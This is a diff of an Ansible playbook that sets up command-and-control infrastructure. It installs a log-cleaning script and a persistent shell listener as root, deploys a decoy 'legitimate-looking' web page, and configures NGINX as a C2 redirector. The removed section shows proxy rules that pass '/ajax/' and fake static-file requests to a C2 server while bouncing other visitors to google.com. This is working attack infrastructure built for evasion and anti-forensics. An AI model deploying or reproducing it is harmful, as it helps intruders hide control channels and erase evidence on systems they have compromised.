@@ -27,7 +27,7 @@
 
 - name: Copy clean-logs.sh script
   copy:
-    src: "clean-logs.sh"
+    src: "../files/clean-logs.sh"
     dest: /opt/c2/clean-logs.sh
     mode: '0700'
     owner: root
@@ -35,7 +35,7 @@
 
 - name: Copy shell handler script
   copy:
-    src: "persistent-listener.sh"
+    src: "../files/persistent-listener.sh"
     dest: /opt/shell-handler/persistent-listener.sh
     mode: '0700'
     owner: root
@@ -72,15 +72,25 @@
 
 - name: Set subdomain value explicitly
   set_fact:
-    redirector_subdomain: "cdn"
+    redirector_subdomain: "{{ redirector_subdomain | default('cdn') }}"
 
-- name: Configure NGINX for C2 redirection
+- name: Configure NGINX for C2 redirection (standard)
   template:
     src: "../templates/redirector-site.conf.j2"
     dest: /etc/nginx/sites-available/default
     mode: '0644'
     owner: root
     group: root
+  when: not (setup_integrated_tracker | default(false) | bool)
+
+- name: Configure NGINX for C2 redirection with tracker support
+  template:
+    src: "../templates/redirector-site-with-tracker.conf.j2"
+    dest: /etc/nginx/sites-available/default
+    mode: '0644'
+    owner: root
+    group: root
+  when: setup_integrated_tracker | default(false) | bool
 
 - name: Create legitimate-looking index.html
   template:
@@ -120,57 +130,6 @@
 - name: Debug NGINX configuration test results if failed
   debug:
     var: nginx_config_test.stderr_lines
-  when: nginx_config_test.rc != 0
-
-- name: Ensure NGINX configurations are valid
-  block:
-    - name: Fix NGINX configuration if test failed
-      copy:
-        content: |
-          server {
-              listen 80;
-              listen [::]:80;
-              server_name cdn.{{ domain }};
-              
-              # Root directory
-              root /var/www/html;
-              index index.html;
-              
-              # Primary location for legitimate traffic
-              location / {
-                  try_files $uri $uri/ =404;
-              }
-              
-              # Special URI patterns for C2 traffic
-              location /ajax/ {
-                  proxy_pass http://{{ c2_ip }}:8888;
-                  proxy_http_version 1.1;
-                  proxy_set_header Host $host;
-                  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-              }
-              
-              # Static resources
-              location ~ ^/static/(css|js|images)/.*\.(css|js|png|jpg|jpeg|gif|ico)$ {
-                  proxy_pass http://{{ c2_ip }}:8888;
-                  proxy_http_version 1.1;
-                  proxy_set_header Host $host;
-                  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-              }
-          }
-          
-          # Catch-all server block
-          server {
-              listen 80 default_server;
-              listen [::]:80 default_server;
-              
-              # Redirect unknown traffic
-              return 301 https://www.google.com;
-          }
-        dest: /etc/nginx/sites-available/default
-        mode: '0644'
-        owner: root
-        group: root
-      when: nginx_config_test.rc != 0
   when: nginx_config_test.rc != 0
 
 - name: Restart NGINX
